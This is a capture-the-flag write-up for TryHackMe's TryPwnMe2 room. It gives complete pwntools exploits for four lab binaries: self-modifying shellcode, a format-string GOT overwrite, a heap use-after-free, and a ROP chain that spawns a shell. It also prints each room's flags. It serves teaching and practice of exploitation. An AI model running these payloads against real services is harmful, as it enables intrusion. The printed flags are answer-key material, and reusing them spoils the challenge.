# TryPwnMe2 TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** TryPwnMe2  
**Difficulty:** Hard  
**Category:** Binary Exploitation (Pwn)  
**Target IP:** `10.48.161.74`  
**Date:** 2026-08-25  

---

## Table of Contents

1. [Overview](#overview)
2. [Task 3 — TryExecMe2 (Port 5002)](#task-3--tryexecme2-port-5002)
3. [Task 4 — NotSpecified2 (Port 5000)](#task-4--notspecified2-port-5000)
4. [Task 5 — TryaNote (Port 5001)](#task-5--tryanote-port-5001)
5. [Task 6 — SlowServer (Port 5555)](#task-6--slowserver-port-5555)
6. [Flags Summary](#flags-summary)
7. [Key Takeaways](#key-takeaways)

---

## Overview

TryPwnMe2 is a multi-challenge binary exploitation room featuring four distinct pwn challenges, each running as a separate service on the target. The challenges cover shellcode filtering, format string exploitation, heap exploitation, and ROP chain construction.

**Provided Materials:** `materials-trypwnmetwo.zip`

| Challenge | Port | Vulnerability Type | Flag Format |
|-----------|------|--------------------|-------------|
| TryExecMe2 | 5002 | Shellcode filter bypass | `THM{*}` (44 chars) |
| NotSpecified2 | 5000 | Format string → GOT overwrite | `THM{*}` (35 chars) |
| TryaNote | 5001 | Heap UAF → libc leak | `THM{*}` (42 chars) |
| SlowServer | 5555 | PIE leak + Stack BOF + ROP | `THM{*}` (38 chars) |

---

## Task 3 — TryExecMe2 (Port 5002)

### Binary Analysis

```bash
file TryExecMe2/tryexecme2
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

checksec --file=TryExecMe2/tryexecme2
# PIE: enabled, NX: enabled, No canary
```

### Vulnerability

The binary:
1. `mmap`s an RWX region at `0xcafe0000` (size `0x64`, flags `PROT_READ|PROT_WRITE|PROT_EXEC`)
2. Reads up to `0x80` bytes of user input into it
3. Calls `forbidden()` to check for banned byte sequences
4. If check passes, **jumps directly to the shellcode** via `call *%rdx`

### Forbidden Bytes (`forbidden()` function)

The checker iterates over the first `0x7f` bytes and blocks these two-byte sequences:

| Bytes | Instruction |
|-------|-------------|
| `\x0f\x05` | `syscall` |
| `\x0f\x34` | `sysenter` |
| `\xcd\x80` | `int 0x80` |

### Bypass Strategy — Self-Modifying Shellcode

Since all direct syscall instructions are forbidden, we use **self-modifying shellcode** that writes the syscall bytes at runtime:

```
1. Set up execve("/bin/sh", NULL, NULL) registers
2. Write \x0e\x04 to a location ahead in the shellcode
3. INC each byte → produces \x0f\x05 (syscall) at runtime
4. Jump to the newly-written syscall instruction
```

This works because the mmap region is **RWX** — readable, writable, AND executable.

### Exploit

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rax, rax
    mov al, 0x3b

    lea rbx, [rip + 0x05]
    mov byte ptr [rbx], 0x0e
    mov byte ptr [rbx+1], 0x04
    inc byte ptr [rbx]
    inc byte ptr [rbx+1]
    jmp rbx

    .byte 0x90, 0x90
''')

r = remote('10.48.161.74', 5002)
r.recvuntil(b'Give me your spell, and I will execute it:')
r.recvline()
r.send(shellcode)
r.recvuntil(b'Executing Spell...')
r.recvline()
r.recvline()
r.sendline(b'cat flag.txt')
print(r.recv(timeout=3))
```

### Flag

```
THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}
```

---

## Task 4 — NotSpecified2 (Port 5000)

### Binary Analysis

```bash
checksec --file=NotSpecified2/notspecified2
# Arch: amd64, RELRO: Partial, Stack: No canary, NX: enabled, PIE: No PIE
```

**Key:** `Partial RELRO` + `No PIE` = writable GOT with fixed addresses.

### Vulnerability

The binary effectively does:

```c
read(0, username, 0x200);
printf("Thanks ");
printf(username);   // <-- FORMAT STRING VULNERABILITY
exit(0x539);
```

User input is passed **directly** as the format string to `printf`.

### Exploitation Strategy — Two-Stage GOT Overwrite

**Problem:** Only ONE `printf(buf)` call before `exit()`. We need to:
1. First leak libc to calculate addresses
2. Then overwrite `exit@GOT` with a one_gadget

**Solution:** Use the single `printf` call to simultaneously:
- Leak a libc address from the stack (`%3$p`)
- Overwrite `exit@GOT` → `main()` (loop back for a second chance)

Then on the second call, overwrite `exit@GOT` → one_gadget.

### Finding the Format String Offset

```bash
python3 -c "print('%1\$p.%2\$p.%3\$p.%4\$p.%5\$p.%6\$p')" | nc 10.48.161.74 5000
# AAAA appears at offset 6
# Stack position 3 = libc address (__libc_start_main + 0xc77)
```

### libc Base Calculation

```python
libc_base = libc_leak - 0x114a37
# leak & 0xfff = 0xa37
# __libc_start_main & 0xfff = 0xdc0
# offset = (0xa37 - 0xdc0) % 0x1000 = 0xc77
# So: libc_base = leak - 0x29dc0 - 0xc77 = leak - 0x114a37
```

### Exploit

```python
from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./notspecified2", checksec=False)

r = remote('10.48.161.74', 5000)

# Stage 1: Leak libc + redirect exit -> main
payload  = b"%3$pBBBB"
payload += b"%110x%11$hhn%146c%12$hhn".ljust(32, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)

r.recvuntil(b"Please provide your username:")
r.sendline(payload)

leak = r.recvuntil(b"BBBB")
libc_leak = int(leak.split(b" ")[1][:-4], 16)
libc_base = libc_leak - 0x114a37

# Stage 2: Overwrite exit@GOT with one_gadget
one_gadget = libc_base + 0xebcf5
payload2 = fmtstr_payload(6, {binary.got["exit"]: one_gadget})

r.recvuntil(b"Please provide your username:")
r.sendline(payload2)

r.sendline(b"cat flag.txt")
r.recvuntil(b"THM{")
print("THM{" + r.recvuntil(b"}").decode())
```

### Flag

```
THM{f0rm4t-str1ng-n0t-sp3cified-ag4in}
```

---

## Task 5 — TryaNote (Port 5001)

### Binary Analysis

```bash
file TryaNote/tryanote
# ELF 64-bit LSB pie executable, dynamically linked, not stripped
```

The binary is a **note manager** with a menu:
1. Create note
2. Show note  
3. Update note
4. Delete note
5. Win (calls a note as a function pointer)

### Vulnerability — Use-After-Free (UAF)

After `delete(index)`, the pointer is freed but **not cleared** (no null-out). This means:
- `show(index)` — still reads from freed memory
- `update(index)` — still writes to freed memory

### Exploitation Strategy

```
Create 2 large chunks (0x1000) → land in unsorted bin
    ↓
Free chunk 0 → unsorted bin fd/bk = main_arena + offset (libc pointer)
    ↓
show(0) → UAF read leaks the libc pointer
    ↓
Calculate libc base
    ↓
Create new note → write system() address into it
    ↓
win(note_idx, /bin/sh_addr) → calls system("/bin/sh")
```

### Unsorted Bin Leak

When a large chunk is freed into the unsorted bin, glibc writes `main_arena` pointers into the chunk's `fd` and `bk` fields. Reading these via UAF gives us a libc leak.

```python
libc_base = leak - 0x219ce0  # main_arena offset in this libc
```

### Exploit

```python
from pwn import *

libc = ELF("./libc.so.6", checksec=False)
r = remote('10.48.161.74', 5001)

def create(size, data):
    r.sendlineafter(b"\n>>", b"1")
    r.sendlineafter(b"Enter entry size:\n", str(size).encode())
    r.sendlineafter(b"Enter entry data:\n", data)

def show(index):
    r.sendlineafter(b"\n>>", b"2")
    r.sendlineafter(b"Enter entry index:\n", str(index).encode())

def delete(index):
    r.sendlineafter(b"\n>>", b"4")
    r.sendlineafter(b"Enter entry index:\n", str(index).encode())

def win(index, data):
    r.sendlineafter(b"\n>>", b"5")
    r.sendlineafter(b"Enter the index:", str(index).encode())
    r.sendlineafter(b"Enter the data:", str(data).encode())

# Leak libc via unsorted bin UAF
create(0x1000, b"A")
create(0x1000, b"A")  # prevent top chunk consolidation
delete(0)
show(0)  # read freed chunk's fd pointer = libc leak

leak = u64(r.recvline().rstrip().ljust(8, b"\x00"))
libc_base = leak - 0x219ce0
libc.address = libc_base

# Write system() into note index 2
create(0x200, p64(libc.sym["system"]))

# win(2, /bin/sh) → system("/bin/sh")
binsh = next(libc.search(b"/bin/sh"))
win(2, binsh)

r.sendline(b"cat flag.txt")
print(r.recv(timeout=5))
```

### Flag

```
THM{l3arning-h3ap-1nt3rn4ls-with-the-b3ar}
```

---

## Task 6 — SlowServer (Port 5555)

### Binary Analysis

```bash
file SlowServer/slowserver
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

checksec --file=SlowServer/slowserver
# PIE: enabled, NX: enabled, No canary
```

A custom HTTP server with three request handlers:
- `GET` — serves files
- `DEBUG` — format string vulnerability
- `POST` — stack buffer overflow

### Vulnerabilities

#### 1. Format String in DEBUG Handler

```c
// handle_debug_request:
char buf[0x400];
sprintf(buf, user_input);  // <-- format string
write(fd, buf, strlen(buf));
```

`DEBUG %136$p` leaks a stack address pointing into the binary → PIE bypass.

#### 2. Stack Overflow in POST Handler

```c
// handle_post_request:
char buf[0x80];              // only 0x80 bytes on stack
memcpy(buf, body, 0x400);   // copies up to 0x400 bytes!
```

Classic stack overflow — 0x400 bytes copied into 0x80 byte buffer.

**Offsets:**
- RBP offset: 16 bytes after `POST `
- RIP offset: 24 bytes after `POST `

### ROP Gadgets

Found via ROPgadget in the binary (PIE-relative):

```
0x180b : pop rax ; ret
0x1816 : pop rdi ; xor rdi, rbp ; ret   ← unusual gadget!
0x1811 : pop rsi ; ret
0x180d : pop rdx ; pop r12 ; ret
0x1807 : push rbp ; mov rbp, rsp ; pop rax ; ret
0x1813 : syscall
```

### Exploitation Strategy

```
Stage 1: DEBUG %136$p  →  leak binary address  →  compute PIE base
    ↓
Stage 2: POST + ROP chain:
    - padding (16 bytes) + "/bin/sh\x00" at saved RBP
    - dup2(4, 0) — redirect stdin from socket (fd=4)
    - dup2(4, 1) — redirect stdout to socket (fd=4)
    - execve("/bin/sh", 0, 0)
```

### The Unusual `pop rdi; xor rdi, rbp` Gadget

Since there's no clean `pop rdi; ret`, the gadget `pop rdi; xor rdi, rbp; ret` is used creatively:

- **For execve:** `pop rdi = 0`, then `0 XOR rbp = rbp` = address of `/bin/sh` on stack ✓
- **For dup2:** `pop rdi = value`, then XOR with rbp to produce `4` (socket fd)

### Why dup2?

`execve("/bin/sh")` spawns a shell, but stdin/stdout are connected to the **process's pipes**, not the **network socket**. The socket is fd `4`. Using `dup2(4, 0)` and `dup2(4, 1)` redirects stdin/stdout to the socket so we can interact with the shell over the network.

### Exploit

```python
from pwn import *

context.update(os="linux", arch="amd64", log_level="info")

HOST = "10.48.161.74"
PORT = 5555

# Stage 1: PIE leak via DEBUG format string
r1 = remote(HOST, PORT)
r1.sendline(b"DEBUG %136$p")
leak = int(r1.recv(timeout=5).strip(), 16)
binary_base = leak - 0x1780
r1.close()

# Gadgets (add PIE base)
pop_rax         = binary_base + 0x180b
pop_rdi_xor_rbp = binary_base + 0x1816
pop_rsi         = binary_base + 0x1811
pop_rdx_r12     = binary_base + 0x180d
push_rbp        = binary_base + 0x1807
syscall         = binary_base + 0x1813

SYS_execve = 59
SYS_dup2   = 33

# Stage 2: POST overflow + ROP chain
payload  = b"POST "
payload += b"A" * 16          # padding to saved RBP
payload += b"/bin/sh\x00"     # saved RBP = ptr to /bin/sh

# dup2(4, 0)
payload += p64(pop_rdi_xor_rbp) + b"+bin/sh\x00"
payload += p64(pop_rax) + p64(SYS_dup2)
payload += p64(pop_rsi) + p64(0)
payload += p64(syscall)

# dup2(4, 1)
payload += p64(pop_rdi_xor_rbp) + b"+bin/sh\x00"
payload += p64(pop_rax) + p64(SYS_dup2)
payload += p64(pop_rsi) + p64(1)
payload += p64(syscall)

# execve("/bin/sh", 0, 0)
payload += p64(push_rbp)
payload += p64(pop_rdi_xor_rbp) + p64(0)
payload += p64(pop_rax) + p64(SYS_execve)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_r12) + p64(0) + p64(0)
payload += p64(syscall)
payload += b" \n"

r2 = remote(HOST, PORT)
r2.sendline(payload)
r2.sendline(b"")
r2.sendline(b"cat flag.txt")
print(r2.recv(timeout=5))
```

### Flag

```
THM{ab4d-w3b-s3rv3r-g00d-rop-my-fr1end}
```

---

## Flags Summary

| Task | Challenge | Port | Flag |
|------|-----------|------|------|
| Task 3 | TryExecMe2 | 5002 | `THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}` |
| Task 4 | NotSpecified2 | 5000 | `THM{f0rm4t-str1ng-n0t-sp3cified-ag4in}` |
| Task 5 | TryaNote | 5001 | `THM{l3arning-h3ap-1nt3rn4ls-with-the-b3ar}` |
| Task 6 | SlowServer | 5555 | `THM{ab4d-w3b-s3rv3r-g00d-rop-my-fr1end}` |

---

## Key Takeaways

1. **Shellcode filter bypass** — When direct syscall instructions are blocked, self-modifying shellcode in RWX memory can write the forbidden bytes at runtime and then execute them.

2. **Format string exploitation** — `printf(user_input)` without a format specifier allows arbitrary memory reads (`%p`) and writes (`%n`). Always use `printf("%s", user_input)`.

3. **Two-stage format string** — When only one `printf` call is available, use it to redirect `exit@GOT → main()` to create a loop, then perform the real exploit on the next iteration.

4. **Heap UAF** — Always null-out pointers after `free()`. Freed unsorted bin chunks contain libc pointers that can be leaked to defeat ASLR.

5. **PIE bypass** — Format strings in custom servers often leak stack/binary addresses. Even with PIE enabled, a single leaked pointer can reveal the base address.

6. **ROP + dup2** — When spawning a shell over a network socket, `dup2(sockfd, 0)` and `dup2(sockfd, 1)` are essential to connect stdin/stdout to the socket so the shell is interactive over the network.

7. **Unusual ROP gadgets** — Sometimes you won't find clean `pop rdi; ret` gadgets. Understand what gadgets are available and craft creative solutions (e.g., `pop rdi; xor rdi, rbp` used with rbp pre-loaded with the desired value).

---

## References

- [pwntools Documentation](https://docs.pwntools.com/)
- [HackTricks - Format String](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/format-strings)
- [HackTricks - Heap Exploitation](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/heap)
- [ROP Emporium](https://ropemporium.com/)
- [One Gadget](https://github.com/david942j/one_gadget)
- [TryHackMe - TryPwnMe2](https://tryhackme.com/room/trypwnmetwo)
